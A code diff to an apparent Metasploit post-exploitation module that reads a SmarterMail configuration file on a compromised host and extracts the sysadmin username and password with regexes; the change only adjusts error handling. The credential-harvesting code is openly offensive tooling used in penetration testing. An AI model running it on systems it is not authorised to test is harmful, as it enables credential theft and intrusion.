@@ -77,17 +77,21 @@ class Metasploit3 < Msf::Post
   #
   def get_smartermail_creds(path)
     result = {}
+    data   = ''
+
     vprint_status "#{peer} - Retrieving SmarterMail sysadmin password"
     begin
-      data = read_file("#{path}") || ''
+      data = read_file("#{path}")
     rescue Rex::Post::Meterpreter::RequestError => e
       print_error "#{peer} - Failed to download #{path} - #{e.to_s}"
-      return
+      return result
     end
-    if data.nil?
+
+    if data.blank?
       print_error "#{peer} - Configuration file is empty."
-      return
+      return result
     end
+
     username = data.match(/<sysAdminUserName>(.+)<\/sysAdminUserName>/)
     password = data.match(/<sysAdminPassword>(.+)<\/sysAdminPassword>/)
     result['username'] = username[1] unless username.nil?
